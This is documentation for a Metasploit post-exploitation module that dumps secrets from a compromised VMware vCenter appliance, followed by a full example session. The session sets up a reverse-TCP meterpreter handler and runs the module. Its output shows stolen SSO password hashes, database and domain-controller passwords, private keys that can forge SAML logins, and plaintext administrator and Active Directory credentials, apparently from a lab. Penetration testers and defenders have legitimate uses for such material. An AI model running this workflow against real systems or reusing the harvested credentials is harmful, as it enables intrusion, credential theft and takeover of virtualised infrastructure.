Grab secrets and keys from the vCenter server and add them to loot. Secrets include the dcAccountDN
and dcAccountPassword for the vCenter machine which can be used for maniuplating the SSO domain via
standard LDAP interface; good for plugging into the vmware_vcenter_vmdir_ldap module or for adding
new SSO admin users. The MACHINE_SSL, VMCA_ROOT and SSO IdP certificates with assocaited private keys
are also plundered and can be used to sign forged SAML assertions for the /ui admin interface.

## Vulnerable Application
This module is tested against the vCenter appliance only; it will not work on Windows vCenter
instances. It is intended to be run after successfully acquiring root access on a vCenter appliance
and is useful for penetrating further into the environment following a vCenter exploit that results
in a root shell. This module has been tested against vCenter appliance versions 7.0 and 6.7 but will
probably work against other versions of vCenter appliance.

## Verification Steps
This is a post module and requires a meterpreter or shell session on the vCenter appliance with root
access.

1. Start msfconsole
2. Get session on vCenter appliance via exploit of your choice and background it
3. Do: `use post/linux/gather/vcenter_secrets_dump`
4. Do: `set session <session>`
15. Do: `dump`

## Options
**SESSION**

Which session to use, which can be viewed with `sessions -l`

## Advanced Options
**DUMP_VMDIR**

Boolean value that controls whether the module will attempt to extract vSphere SSO domain
information, including SSO user hashes and a complete LDIF dump of the SSO directory. Defaults
to true.

**DUMP_VMAFD**

Boolean value that controls whether the module will attempt to extract vSphere certificates, private
keys, and secrets. Defaults to true.

**DUMP_SPEC**

If DUMP_VMAFD is also true, attempt to extract VM Guest Customization secrets from PSQL using the
DATA-ENCIPHERMENT key extracted from VMAFD. Defaults to true.

## Scenarios
Example run from meterpreter session on vCenter appliance version 7.0.2

```
msf6 > use multi/handler
set payload linux/x86/meterpreter/reverse_tcp
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
set LPORT 4444
msf6 exploit(multi/handler) > set LHOST 192.168.101.10
LHOST => 192.168.101.10
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.101.10:4444 
[*] Sending stage (989032 bytes) to 192.168.100.11
[*] Meterpreter session 1 opened (192.168.101.10:4444 -> 192.168.100.11:53410 ) at 2022-04-28 16:22:17 -0400

meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/linux/gather/vcenter_secrets_dump
msf6 post(linux/gather/vcenter_secrets_dump) > set session 1
session => 1
msf6 post(linux/gather/vcenter_secrets_dump) > dump

[*] Gathering vSphere SSO domain information ...
[*] vSphere Hostname and IPv4: vcenteralpha.cesium137.io [192.168.100.11]
[+] vSphere SSO DC DN: cn=vcenteralpha.cesium137.io,ou=Domain Controllers,dc=alpha,dc=vsphere,dc=local
[+] vSphere SSO DC PW: .AwoZ1;wd>x_b=M1FQ'}
[*] Extracting PostgreSQL database credentials ...
[+] VCDB Name: VCDB
[+] VCDB User: vc
[+] VCDB PW: my6h@)IN1jW$nHT{
[*] Extracting vSphere SSO domain information ...
[*] Dumping vmdir schema to LDIF ...
[+] LDIF Dump: /root/.msf4/loot/20220428162238_default_192.168.100.11_vmdir_339905.ldif
[*] Processing vmdir LDIF (this may take several minutes) ...
[*] Processing LDIF entries ...
[*] Processing SSO account hashes ...
[+] vSphere SSO User Credential: cn=vcenteralpha.cesium137.io,ou=Domain Controllers,dc=alpha,dc=vsphere,dc=local:$dynamic_82$f48caa19007e8bb3d76a7d172e2d1976f4747e0ed84159a712eb58156ede7478827909bf4acf9f71b74616ce5110d99b8426d8b3295b02c04aacff3c27607ab8$HEX$9374651ada3414775604fbdb150c8cdc
[+] vSphere SSO User Credential: CN=waiter 66bac9fd-6a99-43eb-8661-1295c39e9e4d,cn=users,dc=alpha,dc=vsphere,dc=local:$dynamic_82$8335fa00d0498f1028691aced7d8945be0fa1f689dc628a3307ec7918a8fcdb04587ebd8a6dc1b14cacc0c11e4f84c5e022108e0950b62dc63f3f37c0a3b3453$HEX$4108122797d8894b9963e5ac943918b9
[+] vSphere SSO User Credential: cn=krbtgt/ALPHA.VSPHERE.LOCAL,cn=users,dc=ALPHA,dc=VSPHERE,dc=LOCAL:$dynamic_82$0da378937caf846413b0a9a328e9fe901513bddddea9a0de5ca520f4d7eca9d2eeb7287a26f0d079941bb46df36a5b321c53b807e59c55b10bb62ff260e28021$HEX$266ca458d66911df01347b372939ae2a
[+] vSphere SSO User Credential: cn=K/M,cn=users,dc=ALPHA,dc=VSPHERE,dc=LOCAL:$dynamic_82$c20ca496510e8e6a0d3d9aa470dfe0baf06ccfb2ecc2e4952d232859e8fc22ccd3108926eb115574043652157db3f1d557af1cd1580190546178758eee57834a$HEX$22209783f4c187b777a31c2a814c2ff7
[+] vSphere SSO User Credential: cn=Administrator,cn=Users,dc=alpha,dc=vsphere,dc=local:$dynamic_82$f96cd214646ba2e4e21774a183f18572bc3d6c4174801d0523cbdc04d02bf69b102bfe9d68fdd71c5866f4972b2359516e65f59c4bda6eebd3cdca59b5f55be8$HEX$4f267135b496ff3119afc21fefda8643
[+] vSphere SSO User Credential: cn=vmca/vcenteralpha.cesium137.io@ALPHA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=alpha,dc=vsphere,dc=local:$dynamic_82$ee963a2f36d38a73e5cf4be729e7be4f491c97fc91b3e9bed96216de9bf72914d1442c49650b07366e9347369ce892d823e06613195027e3f44dfd50662b98dc$HEX$842fdf0b5b972c8f722fb3139142231d
[+] vSphere SSO User Credential: cn=ldap/vcenteralpha.cesium137.io@ALPHA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=alpha,dc=vsphere,dc=local:$dynamic_82$85523e5ad2ac353b925a0cc9f0fad88c881b17d5b218fdd568fb819a7bc58abf7e8783013e22468c657cae7f776ec77fb8b0ad815ef5cdc6ea114c701f19fa52$HEX$4faf7011a11a4939216a1211a4b08cea
[+] vSphere SSO User Credential: cn=DNS/vcenteralpha.cesium137.io@ALPHA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=alpha,dc=vsphere,dc=local:$dynamic_82$ad40b15f98588bc0c856a0f881ea857d6f3442a6755b9c33e40c7960d1833414d25ef96120f9416fca96d0ecfe3df6ddc1e992e5881baeacdcc4610bd43eda79$HEX$f3d9e1c742d9342c78c1825ab5b7efee
[+] vSphere SSO User Credential: cn=host/vcenteralpha.cesium137.io@ALPHA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=alpha,dc=vsphere,dc=local:$dynamic_82$bbcb9c30d8c1a40f409d24fe6ede60df7bf4860a9bdd50b146d063a194fdadb0df80d81ea5ea48a377f20709fa1c22f696facde785b160ceb0eb92eb5f8c5308$HEX$5fab6ef4332396fb4b4410cca448d52d
[*] Extracting certificates from vSphere platform ...
[+] VMCA_ROOT key: /root/.msf4/loot/20220428162239_default_192.168.100.11_vmca_411348.key
[+] VMCA_ROOT cert: /root/.msf4/loot/20220428162239_default_192.168.100.11_vmca_551671.pem
[+] SSO_STS_IDP key: /root/.msf4/loot/20220428162241_default_192.168.100.11_idp_775724.key
[+] SSO_STS_IDP cert: /root/.msf4/loot/20220428162241_default_192.168.100.11_idp_747430.pem
[+] MACHINE_SSL_CERT key: /root/.msf4/loot/20220428162241_default_192.168.100.11_ssl_134237.key
[+] MACHINE_SSL_CERT cert: /root/.msf4/loot/20220428162242_default_192.168.100.11_ssl_373472.pem
[+] DATA-ENCIPHERMENT key: /root/.msf4/loot/20220428162243_default_192.168.100.11_data_033857.key
[+] DATA-ENCIPHERMENT cert: /root/.msf4/loot/20220428162243_default_192.168.100.11_data_727693.pem
[*] Searching for secrets in VM Guest Customization Specification XML ...
[*] Initial administrator account password found for vpx_customization_spec 'Windows 10 Ent No Domain Join':
[+] Built-in administrator PW: IAmSam!
[*] Initial administrator account password found for vpx_customization_spec 'Windows 10 Ent':
[+] Built-in administrator PW: Metasploit1$
[*] AD domain join account found for vpx_customization_spec 'Windows 10 Ent':
[+] AD User: administrator@cesium137.io
[+] AD Pass: ThisIsSecret!
[*] Post module execution completed
```
